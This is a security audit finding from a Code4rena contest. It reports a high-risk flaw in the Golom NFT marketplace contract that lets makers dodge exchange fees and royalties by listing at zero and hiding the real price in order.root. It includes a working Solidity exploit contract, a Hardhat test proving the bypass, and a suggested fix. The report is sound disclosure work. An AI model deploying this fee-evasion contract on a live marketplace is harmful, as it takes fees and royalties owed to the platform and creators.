## Tags

- bug
- 3 (High Risk)
- resolved
- sponsor confirmed
- selected-for-report

# [ Users can avoid paying fees while trading trustlessly & using golom's network effects](https://github.com/code-423n4/2022-07-golom-findings/issues/33) 

# Lines of code

https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L203-L271


# Vulnerability details

## Impact
- Users can avoid paying fees while trading trustlessly & using golom's network effects
## Description
- If a maker makes below mentioned `AvoidsFeesContract` a [reservedAddress](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L220) and hides the info about how much they want their NFT in [order.root](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L58), they can avoid paying fees while trading trustlessly and using the nework effects of golom maketplace with 0 [o.totalAmt](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L52). see POC to get a better idea.
- Here the maker uses order.root to hide the amount they want to get paid because it is much cleaner for a POC.
    - but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.
     - Reason they would use deadline is because that is something they can control in the golom NFT frontend
     - They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check in the contract would look a different
## Proof of Concept
- clone the [repo](https://github.com/code-423n4/2022-07-golom) and run `yarn`
- create a `AvoidsFeesContract.sol` contract in `contracts/test/` folder with following code
```
//contract that avoids paying fees everytime

pragma solidity 0.8.11;

import "../core/GolomTrader.sol";

//A maker will be gurranteed a payout if it makes this contract the reservedAddress and hide the payment info about how much they want in Oder.root
//Users will use this every time to trade to avoid paying fees
//They use the networking effects of the golom marketplace without paying the fees
contract AvoidsFeesContract {
    GolomTrader public immutable golomTrader;

    constructor(GolomTrader _golomTrader) {
        golomTrader = _golomTrader;
    }

    function fillAsk(
        GolomTrader.Order calldata o,
        uint256 amount,
        address referrer,
        GolomTrader.Payment calldata p,
        address receiver
    ) public payable {
        require(
            o.reservedAddress == address(this),
            "not allowed if signer has not reserved this contract"
        ); //the signer will only allow this contract to execute the trade and since it has following checks, they will be guranteed a payout they want without paying the fees
        require(
            p.paymentAddress == o.signer,
            "signer needs to be the payment address"
        );
        //I am using root as an example because it is much cleaner for a POC.
        //but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.
        //Reason they would use deadline is because that is something they can control in the golom NFT frontend
        //They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check below would look a little different
        require(
            p.paymentAmt == uint256(o.root),
            "you need to pay what signer wants"
        ); //the maker will hide the payment info in oder.root

        golomTrader.fillAsk{value: msg.value}(
            o,
            amount,
            referrer,
            p,
            receiver = msg.sender
        );
    }
}

```
- add following test in `test/GolomTrader.specs.ts` [here](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L390).
- Also, add `const AvoidsFeesContractArtifacts = ethers.getContractFactory('AvoidsFeesContract');` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L14) line and `import { AvoidsFeesContract as AvoidsFeesContractTypes } from '../typechain/AvoidsFeesContract';` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L28) line.
- run `npx hardhat compile && npx hardhat test`
```
       it.only('should allow malicious contract to execute the trade while bypassing the fees', async () => {
            //deploy the malicious contract
            const avoidsFeesContract: AvoidsFeesContractTypes = (await (await AvoidsFeesContractArtifacts).deploy(golomTrader.address)) as AvoidsFeesContractTypes;

            //here the frontend calculates exchangeAmount and prePaymentAmt as a percentage of how much the make wants to receive for their NFT. 
            //as far as the frontend is concerned, the maker inputs 0 for their NFT value which in turn makes the exchangeAmount and prePaymentAmt 0 
            let exchangeAmount = ethers.utils.parseEther('0'); // nothing to the exchange
            let prePaymentAmt = ethers.utils.parseEther('0'); // no royalty cut
            let totalAmt = ethers.utils.parseEther('0');
            let tokenId = await testErc721.current();

            let nftValueThatMakerWants = ethers.utils.parseEther('10.25');

            const order = {
                collection: testErc721.address,
                tokenId: tokenId,
                signer: await maker.getAddress(),
                orderType: 0,
                totalAmt: totalAmt,
                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },
                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },
                isERC721: true,
                tokenAmt: 1,
                refererrAmt: 0,
                root: ethers.utils.hexZeroPad(nftValueThatMakerWants.toHexString(), 32), //convert Bignumber to bytes32
                reservedAddress: avoidsFeesContract.address,
                nonce: 0,
                deadline: Date.now() + 100000,
                r: '',
                s: '',
                v: 0,
            };

            let signature = (await maker._signTypedData(domain, types, order)).substring(2); //a valid signature as far as your frontend goes

            order.r = '0x' + signature.substring(0, 64);
            order.s = '0x' + signature.substring(64, 128);
            order.v = parseInt(signature.substring(128, 130), 16);

            let makerBalanceBefore = await ethers.provider.getBalance(await maker.getAddress());

            await avoidsFeesContract.connect(taker).fillAsk(
                order,
                1,
                '0x0000000000000000000000000000000000000000',
                {
                    paymentAmt: nftValueThatMakerWants,
                    paymentAddress: order.signer,
                },
                receiver,
                {
                    value: nftValueThatMakerWants,
                }
            );

            let makerBalanceAfter = await ethers.provider.getBalance(await maker.getAddress());

            expect(await testErc721.balanceOf(await taker.getAddress())).to.be.equals('1');
            expect(makerBalanceAfter.sub(makerBalanceBefore)).to.be.equals(nftValueThatMakerWants);//maker is guaranteed a payout

        });

```

## Tools Used
- the [repo](https://github.com/code-423n4/2022-07-golom) itself. (hardhat)

## Recommended Mitigation Steps
- make sure that o.totalAmt is greater than p.paymentAmt in addition to [this](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L217) check

